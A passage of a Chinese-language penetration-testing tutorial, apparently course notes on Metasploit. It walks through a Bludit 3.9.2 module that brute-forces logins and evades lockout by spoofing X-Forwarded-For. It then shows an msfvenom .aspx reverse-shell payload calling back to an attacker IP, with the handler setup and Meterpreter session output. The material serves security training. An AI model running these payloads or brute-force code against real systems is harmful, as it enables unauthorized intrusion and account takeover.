方法，我们可以从最终的模块代码中删除它。</p><p>我们看到有不同的部分专门用于<code>info</code>模块的页面，<code>options</code>部分。我们不恰当地填写它们，向发现漏洞的个人、CVE 信息和其他相关详细信息提供信用。</p><h4 id="概念验证-模块信息"><a href="#概念验证-模块信息" class="headerlink" title="概念验证 - 模块信息"></a>概念验证 - 模块信息</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">  <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">    <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&quot;Bludit Directory Traversal Image File Upload Vulnerability&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">      This module exploits a vulnerability in Bludit. A remote user could abuse the uuid</span></span><br><span class="line"><span class="string">      parameter in the image upload feature in order to save a malicious payload anywhere</span></span><br><span class="line"><span class="string">      onto the server, and then use a custom .htaccess file to bypass the file extension</span></span><br><span class="line"><span class="string">      check to finally get remote code execution.</span></span><br><span class="line"><span class="string">    &#125;</span>,</span><br><span class="line">    <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">    <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">      [</span><br><span class="line">        <span class="string">&#x27;christasa&#x27;</span>, <span class="comment"># Original discovery</span></span><br><span class="line">        <span class="string">&#x27;sinn3r&#x27;</span>     <span class="comment"># Metasploit module</span></span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">      [</span><br><span class="line">        [<span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2019-16113&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/issues/1081&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac&#x27;</span> ]</span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Arch&#x27;</span>           =&gt; <span class="variable constant_">ARCH_PHP</span>,</span><br><span class="line">    <span class="string">&#x27;Notes&#x27;</span>          =&gt;</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&#x27;SideEffects&#x27;</span> =&gt; [ <span class="variable constant_">IOC_IN_LOGS</span> ],</span><br><span class="line">        <span class="string">&#x27;Reliability&#x27;</span> =&gt; [ <span class="variable constant_">REPEATABLE_SESSION</span> ],</span><br><span class="line">        <span class="string">&#x27;Stability&#x27;</span>   =&gt; [ <span class="variable constant_">CRASH_SAFE</span> ]</span><br><span class="line">      &#125;,</span><br><span class="line">    <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">      [</span><br><span class="line">        [ <span class="string">&#x27;Bludit v3.9.2&#x27;</span>, &#123;&#125; ]</span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;2019-09-07&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>一般标识信息填好后，我们就可以转到<code>options</code>菜单变量了：</p><h4 id="概念验证-功能"><a href="#概念验证-功能" class="headerlink" title="概念验证 - 功能"></a>概念验证 - 功能</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">register_options(</span><br><span class="line">     [</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The base path for Bludit&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITUSER&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The username for Bludit&#x27;</span>]),</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITPASS&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The password for Bludit&#x27;</span>])</span><br><span class="line">     ])</span><br><span class="line"> <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>回顾我们的利用，我们发现需要一个单词表而不是<code>BLUDITPASS</code>模块的变量来暴力破解相同用户名的密码。它看起来像下面的片段：</p><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">OptPath</span>.new(<span class="string">&#x27;PASSWORDS&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;The list of passwords&#x27;</span>,</span><br><span class="line">          <span class="title class_">File</span>.join(<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Config</span>.data_directory, <span class="string">&quot;wordlists&quot;</span>, <span class="string">&quot;passwords.txt&quot;</span>) ])</span><br></pre></td></tr></table></figure><p>其余的漏洞利用代码需要根据移植到 Metasploit Framework 中使用的类、方法和变量进行调整，以使模块最终发挥作用。该模块的最终版本如下所示：</p><h4 id="概念验证"><a href="#概念验证" class="headerlink" title="概念验证"></a>概念验证</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">ExcellentRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpClient</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::PhpEXE</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&quot;Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass&quot;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="string">&#x27;rastating&#x27;</span>, <span class="comment"># Original discovery</span></span><br><span class="line">          <span class="string">&#x27;0ne-nine9&#x27;</span>  <span class="comment"># Metasploit module</span></span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">        [</span><br><span class="line">          [<span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2019-17240&#x27;</span>],</span><br><span class="line">          [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&#x27;</span>],</span><br><span class="line">          [<span class="string">&#x27;PATCH&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/pull/1090&#x27;</span> ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Arch&#x27;</span>           =&gt; <span class="variable constant_">ARCH_PHP</span>,</span><br><span class="line">      <span class="string">&#x27;Notes&#x27;</span>          =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;SideEffects&#x27;</span> =&gt; [ <span class="variable constant_">IOC_IN_LOGS</span> ],</span><br><span class="line">          <span class="string">&#x27;Reliability&#x27;</span> =&gt; [ <span class="variable constant_">REPEATABLE_SESSION</span> ],</span><br><span class="line">          <span class="string">&#x27;Stability&#x27;</span>   =&gt; [ <span class="variable constant_">CRASH_SAFE</span> ]</span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ <span class="string">&#x27;Bludit v3.9.2&#x27;</span>, &#123;&#125; ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;2019-10-05&quot;</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="number">0</span>))</span><br><span class="line">      </span><br><span class="line">     register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The base path for Bludit&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITUSER&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The username for Bludit&#x27;</span>]),</span><br><span class="line">        <span class="title class_">OptPath</span>.new(<span class="string">&#x27;PASSWORDS&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;The list of passwords&#x27;</span>,</span><br><span class="line">        <span class="title class_">File</span>.join(<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Config</span>.data_directory, <span class="string">&quot;wordlists&quot;</span>, <span class="string">&quot;passwords.txt&quot;</span>) ])</span><br><span class="line">      ])</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># -- Exploit code -- #</span></span><br><span class="line">  <span class="comment"># dirty workaround to remove this warning:</span></span><br><span class="line"><span class="comment">#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need &quot;.&quot; at the beginning.</span></span><br><span class="line"><span class="comment"># see https://github.com/nahi/httpclient/issues/252</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebAgent</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Cookie</span> &lt; <span class="variable constant_">HTTP</span><span class="symbol">:</span><span class="symbol">:Cookie</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">domain</span></span><br><span class="line">      <span class="variable language_">self</span>.original_domain</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_csrf</span>(<span class="params">client, login_url</span>)</span><br><span class="line">  res = client.get(login_url)</span><br><span class="line">  csrf_token = <span class="regexp">/input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;/</span>.match(res.body).captures[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth_ok?</span>(<span class="params">res</span>)</span><br><span class="line">  <span class="variable constant_">HTTP</span><span class="symbol">:</span><span class="symbol">:Status</span>.redirect?(res.code) &amp;&amp;</span><br><span class="line">    <span class="regexp">%r&#123;/admin/dashboard&#125;</span>.match?(res.headers[<span class="string">&#x27;Location&#x27;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruteforce_auth</span>(<span class="params">client, host, username, wordlist</span>)</span><br><span class="line">  login_url = host + <span class="string">&#x27;/admin/login&#x27;</span></span><br><span class="line">  <span class="title class_">File</span>.foreach(wordlist).with_index <span class="keyword">do</span> |<span class="params">password, i</span>|</span><br><span class="line">    password = password.chomp</span><br><span class="line">    csrf_token = get_csrf(client, login_url)</span><br><span class="line">    headers = &#123;</span><br><span class="line">      <span class="string">&#x27;X-Forwarded-For&#x27;</span> =&gt; <span class="string">&quot;<span class="subst">#&#123;i&#125;</span>-<span class="subst">#&#123;password[..<span class="number">4</span>]&#125;</span>&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">      <span class="string">&#x27;tokenCSRF&#x27;</span> =&gt; csrf_token,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; username,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; password,</span><br><span class="line">    &#125;</span><br><span class="line">    puts <span class="string">&quot;[*] Trying password: <span class="subst">#&#123;password&#125;</span>&quot;</span></span><br><span class="line">    auth_res = client.post(login_url, data, headers)</span><br><span class="line">    <span class="keyword">if</span> auth_ok?(auth_res)</span><br><span class="line">      puts <span class="string">&quot;\n[+] Password found: <span class="subst">#&#123;password&#125;</span>&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#begin</span></span><br><span class="line"><span class="comment">#  args = Docopt.docopt(doc)</span></span><br><span class="line"><span class="comment">#  pp args if args[&#x27;--debug&#x27;]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  clnt = HTTPClient.new</span></span><br><span class="line"><span class="comment">#  bruteforce_auth(clnt, args[&#x27;--root-url&#x27;], args[&#x27;--user&#x27;], args[&#x27;--#wordlist&#x27;])</span></span><br><span class="line"><span class="comment">#rescue Docopt::Exit =&gt; e</span></span><br><span class="line"><span class="comment">#  puts e.message</span></span><br><span class="line"><span class="comment">#end</span></span><br></pre></td></tr></table></figure><p>如果您想了解有关将脚本移植到 Metasploit 框架中的更多信息，请查看<a href="https://nostarch.com/metasploit">No Starch Press 的 Metasploit：渗透测试人员指南</a>。Rapid7 还创建了关于此主题的博客文章，可<a href="https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/">在此处</a>找到。</p><h1 id="MSF毒液简介"><a href="#MSF毒液简介" class="headerlink" title="MSF毒液简介"></a>MSF毒液简介</h1><hr><p><code>MSFVenom``MSFPayload</code>是和的后继者<code>MSFEncode</code>，这两个独立脚本过去常常与 结合使用，<code>msfconsole</code>为用户提供高度可定制且难以检测的有效负载以进行攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSFVenom`是这两种工具结合的结果。在使用此工具之前，我们必须将用于为特定处理器架构和操作系统版本生成 shellcode 的`|`结果通过管道 ()传输到，其中包含多种编码方案，用于从 shellcode 中删除不良字符。这有时会导致运行时不稳定 - 以及用于规避旧版防病毒 ( ) 和端点入侵防御/入侵检测 ( ) 软件。`MSFPayload``MSFEncode``AV``IPS/IDS</span><br></pre></td></tr></table></figure><p>如今，这两个组合工具为渗透测试人员提供了一种方法，可以为不同的目标主机架构和版本快速制作有效载荷，同时有可能“清理”他们的 shellcode，以便在部署时不会遇到任何错误。如今，AV 规避部分要复杂得多，因为仅基于签名的恶意文件分析已成为过去。<code>Heuristic analysis, machine learning, and deep packet inspection</code>使有效负载更难通过编码方案的几个后续迭代来逃避任何好的 AV 软件。如模块中所示<code>Payloads</code>，提交具有上述相同配置的简单有效载荷产生的命中率为<code>52/65</code>. 就全球恶意软件分析师而言，这就是宾果游戏。（全世界的恶意软件分析师是否真的说“那是宾果游戏”，这一点仍未得到证实。）</p><hr><h2 id="创建我们的有效载荷"><a href="#创建我们的有效载荷" class="headerlink" title="创建我们的有效载荷"></a>创建我们的有效载荷</h2><p>假设我们发现了一个开放的 FTP 端口，该端口要么凭据薄弱，要么意外地对匿名登录开放。现在，假设 FTP 服务器本身链接到在<code>tcp/80</code>同一台机器的端口上运行的 Web 服务，并且可以在 Web 服务的目录中查看 FTP 根目录中找到的所有文件<code>/uploads</code>。我们还假设 Web 服务没有任何检查允许我们作为客户端在其上运行的内容。</p><p>假设我们被允许从 Web 服务中调用任何我们想要的东西。在这种情况下，我们可以直接通过 FTP 服务器上传 PHP shell 并从 Web 访问它，触发有效载荷并允许我们从受害机器接收反向 TCP 连接。</p><h4 id="扫描目标"><a href="#扫描目标" class="headerlink" title="扫描目标"></a>扫描目标</h4><p> 扫描目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h4 id="FTP-匿名访问"><a href="#FTP-匿名访问" class="headerlink" title="FTP 匿名访问"></a>FTP 匿名访问</h4><p> FTP 匿名访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ftp 10.10.10.5</span><br><span class="line"></span><br><span class="line">Connected to 10.10.10.5.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name (10.10.10.5:root): anonymous</span><br><span class="line"></span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Password: ******</span><br><span class="line"></span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ftp&gt; ls</span><br><span class="line"></span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  05:37PM                  689 iisstart.htm</span><br><span class="line">03-17-17  05:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure><p>注意 aspnet_client，我们意识到该框将能够运行<code>.aspx</code>反向 shell。对我们来说幸运的是，<code>msfvenom</code>可以毫无问题地做到这一点。</p><h4 id="生成有效载荷"><a href="#生成有效载荷" class="headerlink" title="生成有效载荷"></a>生成有效载荷</h4><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx &gt; reverse_shell.aspx</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of aspx file: 2819 bytes</span><br></pre></td></tr></table></figure><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates</span><br></pre></td></tr></table></figure><p>现在，我们只需要导航到<code>http://10.10.10.5/reverse_shell.aspx</code>，它就会触发<code>.aspx</code>负载。然而，在我们这样做之前，我们应该在 msfconsole 上启动一个侦听器，以便在其中捕获反向连接请求。</p><h4 id="MSF-设置-Multi-Handler"><a href="#MSF-设置-Multi-Handler" class="headerlink" title="MSF - 设置 Multi&#x2F;Handler"></a>MSF - 设置 Multi&#x2F;Handler</h4><p> MSF - 设置 Multi&#x2F;Handler</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q </span><br><span class="line"></span><br><span class="line">msf6 &gt; use multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 10.10.14.5</span><br><span class="line"></span><br><span class="line">LHOST =&gt; 10.10.14.5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 1337</span><br><span class="line"></span><br><span class="line">LPORT =&gt; 1337</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1337 </span><br></pre></td></tr></table></figure><hr><h2 id="执行负载"><a href="#执行负载" class="headerlink" title="执行负载"></a>执行负载</h2><p>现在我们可以触发<code>.aspx</code>Web 服务上的负载。这样做不会在页面上加载任何视觉上的内容，但回顾我们的<code>multi/handler</code>模块，我们会收到一个连接。我们应该确保我们的<code>.aspx</code>文件不包含 HTML，因此我们只会看到一个空白网页。然而，有效负载无论如何都是在后台执行的。</p><h4 id="MSF-Meterpreter-外壳"><a href="#MSF-Meterpreter-外壳" class="headerlink" title="MSF - Meterpreter 外壳"></a>MSF - Meterpreter 外壳</h4><p> MSF - Meterpreter 外壳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1337 </span><br><span class="line"></span><br><span class="line">[*] Sending stage (176195 bytes) to 10.10.10.5</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.5:1337 -&gt; 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: IIS APPPOOL\Web</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died</span><br></pre></td></tr></table></figure><p>如果 Meterpreter 会话死得太频繁，我们可以考虑对其进行编码以避免在运行时出错。我们可以选择任何可行的编码器，无论如何它最终都会提高我们成功的机会。</p><hr><h2 id="本地漏洞利用建议"><a href="#本地漏洞利用建议" class="headerlink" title="本地漏洞利用建议"></a>本地漏洞利用建议</h2><p>作为提示，有一个名为<code>Local Exploit Suggester</code>. 我们将在这个例子中使用这个模块，因为 Meterpreter shell 登陆用户<code>IIS APPPOOL\Web</code>，自然没有很多权限。此外，运行该<code>sysinfo</code>命令向我们展示了系统是 x86 位架构，让我们更有理由相信 Local Exploit Suggester。</p><h4 id="MSF-搜索本地漏洞利用建议者"><a href="#MSF-搜索本地漏洞利用建议者" class="headerlink" title="MSF - 搜索本地漏洞利用建议者"></a>MSF - 搜索本地漏洞利用建议者</h4><p> MSF - 搜索本地漏洞利用建议者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 